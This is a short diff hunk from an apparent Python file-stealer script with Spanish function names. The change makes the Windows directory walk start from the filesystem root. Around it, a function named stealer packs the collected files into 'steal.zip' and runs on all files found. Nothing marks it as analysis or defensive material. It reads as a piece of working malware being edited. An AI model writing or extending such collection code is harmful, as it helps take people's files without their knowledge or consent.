@@ -43,7 +43,7 @@ def stealer(files):
             comprimir_archivos("./steal.zip", files)
 #endregion
 if sys.platform == "windows":
-    recorrer_arbol_directorios("C:\\")
+    recorrer_arbol_directorios("\\")
 else:
     recorrer_arbol_directorios("./")
 stealer(files)
